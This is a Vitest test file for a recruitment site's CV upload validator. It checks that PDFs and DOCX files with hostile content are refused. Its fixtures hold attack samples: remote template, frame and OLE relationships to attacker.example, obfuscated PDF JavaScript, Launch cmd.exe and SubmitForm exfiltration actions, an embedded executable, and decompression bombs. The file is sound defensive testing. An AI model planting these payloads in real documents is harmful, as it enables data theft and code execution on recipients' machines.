import { deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { recruitmentCvValidationMessage, validateCvFile } from "./recruitmentFileValidation";
import { DOCUMENT_DECOMPRESSION_LIMITS, truncateExtractedText } from "./documentDecompressionLimits";
import { extractCvDocument } from "./recruitmentAnalysis";
import { buildDocx } from "./testing/zipFixture";
import { libreOfficeCvPdf, packPdfIntoObjectStream } from "./testing/pdfFixture";

const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const validPdf = Buffer.concat([Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"), Buffer.alloc(300, 65)]);
const validDoc = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(300, 66)]);
const validDocx = buildDocx(["Dr Docx Candidate", "Infirmier anesthésiste IADE — 6 ans d’expérience", "Langues : Français, Anglais"]);

function pdfWithStream(dictionary: string, data: Buffer, endOfLine = "\n") {
  return Buffer.concat([
    Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"),
    Buffer.from(`2 0 obj << ${dictionary} /Length ${data.length} >>\nstream${endOfLine}`, "latin1"),
    data,
    Buffer.from("\nendstream\nendobj\n%%EOF\n"),
    Buffer.alloc(300, 32),
  ]);
}

describe("validation et quarantaine des CV", () => {
  it("accepte les signatures attendues pour PDF et DOCX", () => {
    expect(validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.pdf", size: validPdf.length }).checksum).toHaveLength(64);
    expect(validateCvFile({ buffer: validDocx, mimeType: DOCX, originalName: "cv.docx", size: validDocx.length }).mimeType).toContain("officedocument");
  });

  it("refuse le format Word ancien (.doc) à l’envoi, mais traite encore un dossier .doc déjà stocké sans macro", () => {
    expect(() => validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length })).toThrow("cv_validation_legacy_doc_refused");
    expect(recruitmentCvValidationMessage("cv_validation_legacy_doc_refused")).toContain("PDF ou un DOCX");
    expect(validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
    const macroDoc = Buffer.concat([validDoc, Buffer.from("_VBA_PROJECT", "utf16le"), Buffer.alloc(64)]);
    expect(() => validateCvFile({ buffer: macroDoc, mimeType: "application/msword", originalName: "cv.doc", size: macroDoc.length, allowLegacyDoc: true })).toThrow("cv_validation_doc_active_content");
    // A CV that merely mentions VBA as a skill is not a macro.
    const skillDoc = Buffer.concat([validDoc, Buffer.from("Compétences : Excel VBA, Python", "utf16le")]);
    expect(validateCvFile({ buffer: skillDoc, mimeType: "application/msword", originalName: "cv.doc", size: skillDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
  });

  it("rejette une extension ou une signature qui ne correspond pas au type déclaré", () => {
    expect(() => validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.docx", size: validPdf.length })).toThrow("cv_validation_type_mismatch");
    expect(() => validateCvFile({ buffer: Buffer.alloc(300, 70), mimeType: "application/pdf", originalName: "cv.pdf", size: 300 })).toThrow("cv_validation_signature_invalid");
    const fakeDocx = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from("[Content_Types].xml"), Buffer.alloc(300, 67)]);
    expect(() => validateCvFile({ buffer: fakeDocx, mimeType: DOCX, originalName: "cv.docx", size: fakeDocx.length })).toThrow("cv_validation_docx_container_invalid");
  });

  it("rejette les PDF chiffrés, actifs ou excessivement longs avant analyse", () => {
    const encrypted = Buffer.concat([validPdf, Buffer.from(" /Encrypt")]);
    const active = Buffer.concat([validPdf, Buffer.from(" /JavaScript")]);
    const manyPages = Buffer.concat([Buffer.from("%PDF-1.7\n"), Buffer.from(Array.from({ length: 26 }, () => "/Type /Page").join(" ")), Buffer.from(" "), Buffer.alloc(300, 65)]);
    expect(() => validateCvFile({ buffer: encrypted, mimeType: "application/pdf", originalName: "cv.pdf", size: encrypted.length })).toThrow("cv_validation_pdf_encrypted");
    expect(() => validateCvFile({ buffer: active, mimeType: "application/pdf", originalName: "cv.pdf", size: active.length })).toThrow("cv_validation_pdf_active_content");
    expect(() => validateCvFile({ buffer: manyPages, mimeType: "application/pdf", originalName: "cv.pdf", size: manyPages.length })).toThrow("cv_validation_pdf_page_limit_exceeded");
  });

  it("rejette les DOCX dotés de macros, d’objets intégrés ou d’un modèle distant, mais garde les liens hypertexte", () => {
    const rawExternal = Buffer.concat([validDocx, Buffer.from(' TargetMode="External"')]);
    expect(() => validateCvFile({ buffer: rawExternal, mimeType: DOCX, originalName: "cv.docx", size: rawExternal.length })).toThrow("cv_validation_docx_active_content");
    const macro = buildDocx(["CV"], [{ name: "word/vbaProject.bin", content: Buffer.alloc(600, 65) }]);
    expect(() => validateCvFile({ buffer: macro, mimeType: DOCX, originalName: "cv.docx", size: macro.length })).toThrow("cv_validation_docx_active_content");
    const remoteTemplate = buildDocx(["CV"], [{ name: "word/_rels/settings.xml.rels", content: '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>' }]);
    expect(() => validateCvFile({ buffer: remoteTemplate, mimeType: DOCX, originalName: "cv.docx", size: remoteTemplate.length })).toThrow("cv_validation_docx_active_content");
    const hyperlink = buildDocx(["CV"], [{ name: "word/_rels/document.xml.rels", content: '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/example" TargetMode="External"/></Relationships>' }]);
    expect(validateCvFile({ buffer: hyperlink, mimeType: DOCX, originalName: "cv.docx", size: hyperlink.length }).mimeType).toBe(DOCX);
  });

  it("accepte un CV créé depuis un modèle Word local, refuse un modèle, cadre ou objet distant même déguisé", () => {
    const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    const docxWithSettingsRels = (relationships: string) => buildDocx(["CV"], [
      { name: "word/_rels/settings.xml.rels", content: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships}</Relationships>` },
      { name: "word/_rels/document.xml.rels", content: `<Relationships><Relationship Id="rId9" Type="${REL}/hyperlink" Target="https://www.linkedin.com/in/jdupont" TargetMode="External"/></Relationships>` },
    ]);
    const accepted = [
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///C:\\Users\\jdupont\\AppData\\Roaming\\Microsoft\\Templates\\Modern%20chronological%20resume.dotx" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///Users/jdupont/Library/Group%20Containers/UBF8T346G9.Office/User%20Content.localized/Templates.localized/Normal.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="C:\\Modeles\\CV.dotx" TargetMode="External"/>`,
    ];
    for (const relationship of accepted) {
      const docx = docxWithSettingsRels(relationship);
      expect(validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }).mimeType).toBe(DOCX);
    }
    const refused = [
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file://attacker.example/share/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:////attacker.example/share/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="&#104;ttps://attacker.example/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/frame" Target="https://attacker.example/frame.html" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/subDocument" Target="http://attacker.example/sub.docx" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/oleObject" Target="file:///C:/Windows/System32/calc.exe" TargetMode="External"/>`,
      `<Relationship Id='rId1' TargetMode='External' Type='${REL}/attachedTemplate' Target='https://attacker.example/t.dotm'/>`,
      `<Relationship Id="rId1" Note="a>b" Type="${REL}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/>`,
    ];
    for (const relationship of refused) {
      const docx = docxWithSettingsRels(relationship);
      expect(() => validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }), relationship).toThrow("cv_validation_docx_active_content");
    }
  });
});

describe("REC-02 — PDF réels acceptés, actions dangereuses cherchées aussi dans les flux d’objets", () => {
  const validate = (buffer: Buffer) => validateCvFile({ buffer, mimeType: "application/pdf", originalName: "cv.pdf", size: buffer.length });
  const LIBREOFFICE_OPEN_ACTION = "/OpenAction[1 0 R /XYZ null null 0]";
  /** The LibreOffice CV whose opening action runs the given action instead of showing page 1. */
  const openingWith = (action: string) => (source: string) => source.replace(LIBREOFFICE_OPEN_ACTION, `/OpenAction ${action}`);

  it("accepte le CV exporté par LibreOffice et son /OpenAction qui affiche la page 1", async () => {
    const pdf = libreOfficeCvPdf();
    expect(pdf.toString("latin1")).toContain(LIBREOFFICE_OPEN_ACTION);

    expect(validate(pdf)).toMatchObject({ pageCount: 1, securityScanVersion: "document-safety-v4" });
    expect((await extractCvDocument(pdf, "application/pdf")).text).toContain("Dr Camille Martin");
  });

  it("accepte le même CV enregistré avec des flux d’objets (pdf-lib, Acrobat optimisé) : les pages sont comptées dans le flux décompressé", async () => {
    const pdf = packPdfIntoObjectStream(libreOfficeCvPdf());
    expect(pdf.toString("latin1")).not.toMatch(/\/Type\s*\/Page\b/);

    expect(validate(pdf).pageCount).toBe(1);
    // pdf.js reads the rewritten file: it is a valid PDF, not a fixture only the check accepts.
    const extraction = await extractCvDocument(pdf, "application/pdf");
    expect(extraction.text).toContain("Dr Camille Martin");
    expect(extraction.totalPages).toBe(1);
  });

  it("refuse un JavaScript caché dans un flux d’objets, même sans /Type /ObjStm", async () => {
    const hidden = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>") });
    expect(hidden.toString("latin1")).not.toContain("JavaScript");
    // pdf.js reads it, so a PDF reader would run it.
    expect((await extractCvDocument(hidden, "application/pdf")).text).toContain("Dr Camille Martin");
    expect(() => validate(hidden)).toThrow("cv_validation_pdf_active_content");

    const untyped = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"), objectStream: { dictionary: "/Filter/FlateDecode" } });
    expect(() => validate(untyped)).toThrow("cv_validation_pdf_active_content");
  });

  it("décode les noms échappés #XX avant de chercher les actions, dans le fichier comme dans les flux d’objets", () => {
    const actions = [
      "<</S/#4A#61va#53cript/#4A#53(app.alert\\(1\\))>>",
      "<</S/#4C#61unch/F(cmd.exe)>>",
      "<</S/Sub#6DitForm/F(https://attacker.example/collect)>>",
      "<</S/Import#44ata/F(data.fdf)>>",
      "<</Type/Annot/Subtype/Rich#4Dedia>>",
    ];
    for (const action of actions) {
      const raw = Buffer.from(openingWith(action)(libreOfficeCvPdf().toString("latin1")), "latin1");
      expect(() => validate(raw), action).toThrow("cv_validation_pdf_active_content");
      expect(() => validate(packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith(action) })), action).toThrow("cv_validation_pdf_active_content");
    }
    const attachment = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: source => source.replace("/PageMode/UseOutlines", "/Names<</Embedded#46iles<</Names[(cv.exe) 3 0 R]>>>>") });
    expect(() => validate(attachment)).toThrow("cv_validation_pdf_active_content");
  });

  it("refuse un flux d’objets qu’il ne peut pas lire (filtre autre que Flate) au lieu de le croire sans danger", () => {
    const hex = packPdfIntoObjectStream(libreOfficeCvPdf(), {
      edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"),
      objectStream: { dictionary: "/Type/ObjStm/Filter/ASCIIHexDecode", encode: content => Buffer.from(`${content.toString("hex")}>`, "latin1") },
    });
    expect(() => validate(hex)).toThrow("cv_validation_pdf_object_stream_unreadable");
    expect(recruitmentCvValidationMessage("cv_validation_pdf_object_stream_unreadable")).toContain("imprimez-le en PDF depuis votre navigateur");
  });

  it("garde le plafond de décompression pour les flux d’objets", () => {
    const bomb = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
    expect(() => validate(bomb)).toThrow("cv_validation_pdf_decompressed_size_exceeded");
    // Declaring the object stream as a small image does not skip its content.
    const disguised = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Subtype /Image /Width 1 /Height 1 /Filter /FlateDecode", deflateSync(Buffer.from("1 0 << /S /JavaScript /JS (app.alert(1)) >>")));
    expect(() => validate(disguised)).toThrow("cv_validation_pdf_active_content");
  });

  it("dit au candidat quoi faire d’un CV refusé : le réenregistrer en DOCX ou l’imprimer en PDF depuis le navigateur", () => {
    for (const code of ["cv_validation_pdf_active_content", "cv_validation_docx_active_content", "cv_validation_pdf_page_structure_invalid"]) {
      expect(recruitmentCvValidationMessage(code), code).toContain("Réenregistrez votre CV en DOCX ou imprimez-le en PDF depuis votre navigateur");
    }
    expect(recruitmentCvValidationMessage("cv_validation_pdf_active_content")).not.toContain("Enregistrez-le en PDF");
  });
});

describe("bombes de décompression : plafonds avant extraction", () => {
  it("refuse un DOCX de quelques Ko qui se décompresse au-delà de 20 Mo", () => {
    const bomb = buildDocx(["CV"], [{ name: "word/media/filler.bin", content: Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.docxMaxUncompressedBytes + 1024, 0) }]);
    expect(bomb.length).toBeLessThan(100 * 1024);
    expect(() => validateCvFile({ buffer: bomb, mimeType: DOCX, originalName: "cv.docx", size: bomb.length })).toThrow("cv_validation_docx_decompressed_size_exceeded");
    expect(recruitmentCvValidationMessage("cv_validation_docx_decompressed_size_exceeded")).toContain("trop volumineux");
  });

  it("refuse un PDF dont les flux compressés dépassent le plafond, mais pas ses images", () => {
    const flateBomb = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
    expect(flateBomb.length).toBeLessThan(200 * 1024);
    expect(() => validateCvFile({ buffer: flateBomb, mimeType: "application/pdf", originalName: "cv.pdf", size: flateBomb.length })).toThrow("cv_validation_pdf_decompressed_size_exceeded");

    const normal = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.from("BT /F1 12 Tf (Dr Candidat) Tj ET")));
    expect(validateCvFile({ buffer: normal, mimeType: "application/pdf", originalName: "cv.pdf", size: normal.length }).pageCount).toBe(1);

    const hugeImage = pdfWithStream("/Type /XObject /Subtype /Image /Width 100000 /Height 100000 /Filter /FlateDecode", deflateSync(Buffer.alloc(10)));
    expect(() => validateCvFile({ buffer: hugeImage, mimeType: "application/pdf", originalName: "cv.pdf", size: hugeImage.length })).toThrow("cv_validation_pdf_image_too_large");
  });

  it("ne se fie pas au dictionnaire du flux : fin de ligne CR, filtre indirect ou échappé, faux en-tête d’image, compression imbriquée", () => {
    const over = Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32);
    const bomb = deflateSync(over);
    const shapes: Array<[string, Buffer]> = [
      ["CR seul après stream", pdfWithStream("/Filter /FlateDecode", bomb, "\r")],
      ["espaces puis CRLF après stream", pdfWithStream("/Filter /FlateDecode", bomb, "  \r\n")],
      ["filtre en référence indirecte", pdfWithStream("/Filter 9 0 R", bomb)],
      ["nom de filtre échappé", pdfWithStream("/Filter /F#6CateDecode", bomb)],
      ["contenu déguisé en petite image", pdfWithStream("/Subtype /Image /Width 10 /Height 10 /Filter /FlateDecode", bomb)],
      ["image aux dimensions indirectes", pdfWithStream("/Subtype /Image /Width 7 0 R /Height 8 0 R /Filter /FlateDecode", bomb)],
      ["Flate dans Flate", pdfWithStream("/Filter [/FlateDecode /FlateDecode]", deflateSync(bomb))],
    ];
    for (const [label, pdf] of shapes) {
      expect(() => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length }), label).toThrow("cv_validation_pdf_decompressed_size_exceeded");
    }
    // Honest images are still accepted: a declared 1000×1000 RGB photo, and a large one.
    const photo = pdfWithStream("/Type /XObject /Subtype /Image /Width 1000 /Height 1000 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(3_000_000, 90)));
    expect(validateCvFile({ buffer: photo, mimeType: "application/pdf", originalName: "cv.pdf", size: photo.length }).pageCount).toBe(1);
    const scan = pdfWithStream("/Type /XObject /Subtype /Image /Width 2480 /Height 3508 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(2480 * 3508 * 3, 200)));
    expect(validateCvFile({ buffer: scan, mimeType: "application/pdf", originalName: "cv.pdf", size: scan.length }).pageCount).toBe(1);
    expect(recruitmentCvValidationMessage("cv_validation_pdf_processing_timeout")).toContain("trop volumineux");
  });

  it("tronque le texte extrait à 200 000 caractères avec un avertissement", async () => {
    expect(truncateExtractedText("abc", 2)).toEqual({ text: "ab", truncated: true });
    const longDocx = buildDocx(Array.from({ length: 3_000 }, (_, index) => `Expérience ${index} : ${"anesthésie ".repeat(10)}`));
    const extraction = await extractCvDocument(longDocx, DOCX);
    expect(extraction.text.length).toBe(DOCUMENT_DECOMPRESSION_LIMITS.extractedTextMaxChars);
    expect(extraction.warnings).toContain("extracted_text_truncated");
    const shortDocx = buildDocx(["Dr Court", "IADE"]);
    const short = await extractCvDocument(shortDocx, DOCX);
    expect(short.text).toContain("Dr Court");
    expect(short.warnings).not.toContain("extracted_text_truncated");
  });
});
